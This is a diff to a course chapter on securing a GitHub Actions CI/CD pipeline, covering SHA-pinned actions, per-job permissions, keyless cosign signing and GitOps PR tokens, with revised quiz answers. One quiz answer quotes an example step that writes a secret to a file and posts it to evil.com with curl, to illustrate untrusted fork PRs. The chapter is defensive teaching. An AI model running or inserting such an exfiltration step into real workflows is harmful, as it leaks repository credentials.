+    steps:
+      - uses: aquasecurity/trivy-action@ed142fd0673e97e23eac54620cfb913e5ce36c25 # v0.36.0
+        with: { version: 'v0.76.1', scan-type: fs, scan-ref: app/<SERVICE>, severity: 'HIGH,CRITICAL', exit-code: '1' }
+  build-sign-push:                         # stage 4: push to main only; OIDC + cosign
     runs-on: ubuntu-latest
     needs: scan
     if: github.event_name == 'push' && github.ref == 'refs/heads/main'
+    permissions: { contents: read, id-token: write }
     steps:
-      - uses: aws-actions/configure-aws-credentials@v4    # OIDC, no static keys
-      - uses: docker/build-push-action@v6                # multi-arch, push by DIGEST
-      - run: cosign sign --yes <IMAGE>@<DIGEST>           # keyless, ch.15.03
-  update-gitops-pr:                   # stage 5 — open PR on GitOps repo (NOT kubectl apply)
+      - uses: aws-actions/configure-aws-credentials@7474bc4690e29a8392af63c5b98e7449536d5c3a # v4.3.1
+      - uses: docker/build-push-action@10e90e3645eae34f1e60eeb005ba3a3d33f178e8 # v6.19.2
+      - run: cosign sign --yes --recursive <IMAGE>@<DIGEST>   # keyless, 15.03
+  update-gitops-pr:                        # stage 5: PR to the GitOps repo, not kubectl apply
     needs: build-sign-push
     if: github.event_name == 'push' && github.ref == 'refs/heads/main'
-    steps: [ { uses: peter-evans/create-pull-request@v7 } ]
+    permissions: { contents: read }
+    steps:
+      - uses: peter-evans/create-pull-request@22a9089034f40e5a961c8808d113e2c98fb63676 # v7.0.11
+        with: { token: '${{ secrets.GITOPS_PR_TOKEN }}' }   # PAT or App token, not GITHUB_TOKEN
 ```
 
 Checklist:
@@ -681,54 +690,91 @@ Checklist:
 - [ ] Five-job DAG: lint-test → integration-test → scan →
       build-sign-push → update-gitops-pr; fail-fast at each gate
 - [ ] **OIDC** for ECR push (no static AWS keys in repo secrets);
-      `id-token: write` workflow permission
+      `id-token: write` on the build job only
 - [ ] `if: github.event_name == 'push' && github.ref ==
       'refs/heads/main'` on the secret-needing jobs (the "CI ate my
       repo" structural defence)
-- [ ] No `pull_request_target` triggers anywhere; minimal workflow-
-      level `permissions:` (`contents: read`, not `contents: write`)
+- [ ] No `pull_request_target` triggers anywhere; `contents: read` at
+      workflow level, and each job's extra scope in its own `permissions:`
+- [ ] Every third-party action pinned to a commit SHA, with the release
+      in a comment; Trivy and cosign pinned by version
 - [ ] Multi-arch buildx (amd64 + arm64) so Part 14 ch.09 Graviton
       migration is a config bump, not a code change
-- [ ] cosign keyless sign + cosign attest SBOM bound to the **digest**
-      (not a tag); per-leg digest artifact for the fan-in into the
-      GitOps PR job
-- [ ] Branch protection on the GitOps repo: dev auto-merges; staging
-      and prod overlay PRs require human review
+- [ ] cosign keyless sign with `--recursive`, and cosign attest SBOM bound
+      to the **digest** (not a tag); per-leg digest artifact for the fan-in
+      into the GitOps PR job
+- [ ] GitOps PR opened with a PAT or App token scoped to the GitOps repo;
+      branch protection there: dev auto-merges; staging and prod need review
 - [ ] Coverage gates calibrated to risk (read-only services: none;
       write-path: 70%; money: 80%)
-- [ ] Workflow file changes require platform CODEOWNERS review;
-      actions ideally pinned to commit SHAs (teaching here uses major
-      tags)
+- [ ] Third-party service images pinned by digest; CODEOWNERS on
+      `.github/workflows/`
 
 ## Test your understanding
 
-> Try each before opening the answer drawer. The act of trying is the exercise; the answer is the check.
+> Try each before opening the answer drawer. The act of trying is the
+> exercise; the answer is the check.
 
-1. **What is the "CI ate my repo" footgun, and what are the three structural defences the chapter's workflows use against it?**
+1. **What is the "CI ate my repo" footgun, and what are the three structural
+   defences the chapter's workflows use against it?**
    <details><summary>Show answer</summary>
 
-   An untrusted PR (from a fork or external contributor) runs a workflow that has access to secrets — a single `echo $AWS_SECRET > /tmp/x; curl evil.com -d @/tmp/x` step exfiltrates everything the workflow can see. Three defences: (1) `if: github.event_name == 'push' && github.ref == 'refs/heads/main'` guard on the privileged jobs (sign, push, GitOps PR) — fork PRs run lint/test/scan only; (2) workflow-level `permissions:` minimal (`id-token: write` only when needed, default `contents: read`); (3) **don't** use `pull_request_target` against fork code unless the workflow is hardened — that trigger runs in the base repo's context with secrets, which is the exact attack surface. The combination of these three is what makes the workflow safe to expose to public-fork PRs.
+   An untrusted PR (from a fork or external contributor) runs a workflow that
+   has access to secrets — a single `echo $AWS_SECRET > /tmp/x; curl evil.com
+   -d @/tmp/x` step exfiltrates everything the workflow can see. Three
+   defences: (1) `if: github.event_name == 'push' && github.ref ==
+   'refs/heads/main'` guard on the privileged jobs (sign, push, GitOps PR) —
+   fork PRs run lint/test/scan only; (2) workflow-level `permissions:` minimal
+   (`id-token: write` only when needed, default `contents: read`); (3)
+   **don't** use `pull_request_target` against fork code unless the workflow
+   is hardened — that trigger runs in the base repo's context with secrets,
+   which is the exact attack surface. The combination of these three is what
+   makes the workflow safe to expose to public-fork PRs.
 
    </details>
 
-2. **Why does the chapter argue coverage gates should be *asymmetric* across services rather than one cluster-wide threshold?**
+2. **Why does the chapter argue coverage gates should be *asymmetric* across
+   services rather than one cluster-wide threshold?**
    <details><summary>Show answer</summary>
 
-   Risk is asymmetric. payments-worker handles money — a bug is unrecoverable, so 80% coverage on every PR including informational ones is right. orders writes data — 70% on `main` only is right; PRs are advisory. catalog is read-only — no coverage gate, just the race detector. Cargo-culting one threshold (say "80% across the board") trains developers to ignore it: the catalog team adds noise tests to hit the number, the payments team feels the bar is too low, nobody trusts the metric. The chapter's discipline: coverage gates encode a real product decision, calibrated per-service.
+   Risk is asymmetric. payments-worker handles money — a bug is unrecoverable,
+   so 80% coverage on every PR including informational ones is right. orders
+   writes data — 70% on `main` only is right; PRs are advisory. catalog is
+   read-only — no coverage gate, just the race detector. Cargo-culting one
+   threshold (say "80% across the board") trains developers to ignore it: the
+   catalog team adds noise tests to hit the number, the payments team feels
+   the bar is too low, nobody trusts the metric. The chapter's discipline:
+   coverage gates encode a real product decision, calibrated per-service.
 
    </details>
 
-3. **A CI run signs a multi-arch image with `cosign sign <image>` (no `--recursive`), and the GitOps PR opens with the new digest. Three hours later, arm64 nodes report admission failures. Walk through what happened.**
+3. **Why does the GitOps job use a PAT or App token instead of the default
+   `GITHUB_TOKEN`, and what would you see if `GITHUB_TOKEN` opened the PR?**
    <details><summary>Show answer</summary>
 
-   `cosign sign` without `--recursive` signs only the top-level manifest list, not the per-architecture entries. Kyverno's `verifyImages` at admission walks to the platform-specific image being pulled (linux/arm64 on the Graviton nodes) and looks for a signature on *that*; finding none, admission rejects. The fix: `cosign sign --recursive <image>` signs every per-arch entry. The chapter's signing job uses `--recursive` precisely because Phase 14-R Graviton nodes are in play; dropping the flag silently breaks arm64 admission while x86 keeps working. Lesson: multi-arch + cosign + admission verify requires `--recursive` end-to-end.
+   Events triggered by `GITHUB_TOKEN` do not start new workflow runs, so a PR
+   it opens gets no `pull_request` checks, and the required checks never run.
+   The GitOps repo's branch protection then waits on checks that never arrive.
+   [07.03](../07-delivery/03-cicd-pipeline.md) runs this and shows the empty
+   check list. A PAT or App token scoped to `contents: write` and
+   `pull-requests: write` on the GitOps repo starts the checks, and it keeps
+   any compromise inside that one repo.
 
    </details>
 
-4. **Hands-on extension — open a fork PR against the bookstore-platform CI workflow. What runs, what doesn't, and what does the run log show?**
+4. **Hands-on extension — open a fork PR against the bookstore-platform CI
+   workflow. What runs, what doesn't, and what does the run log show?**
    <details><summary>What you should see</summary>
 
-   The lint, test, integration-test, and scan jobs run — they don't need secrets, they need only the public source code. The build-sign-push and update-gitops-pr jobs **skip** because of the `if: github.event_name == 'push' && github.ref == 'refs/heads/main'` guard; the run log shows them with a "skipped" status and a condition that didn't match. Critically, ECR push permissions and the GitOps repo PAT are never used in the fork's run because the jobs that would use them never executed. This is the chapter's structural defence in action — fork contributors can pass tests and submit PRs without holding any credential the workflow has.
+   The lint, test, integration-test, and scan jobs run — they don't need
+   secrets, they need only the public source code. The build-sign-push and
+   update-gitops-pr jobs **skip** because of the `if: github.event_name ==
+   'push' && github.ref == 'refs/heads/main'` guard; the run log shows them
+   with a "skipped" status and a condition that didn't match. Critically, ECR
+   push permissions and the GitOps repo PAT are never used in the fork's run
+   because the jobs that would use them never executed. This is the chapter's
+   structural defence in action — fork contributors can pass tests and submit
+   PRs without holding any credential the workflow has.
 
    </details>
 
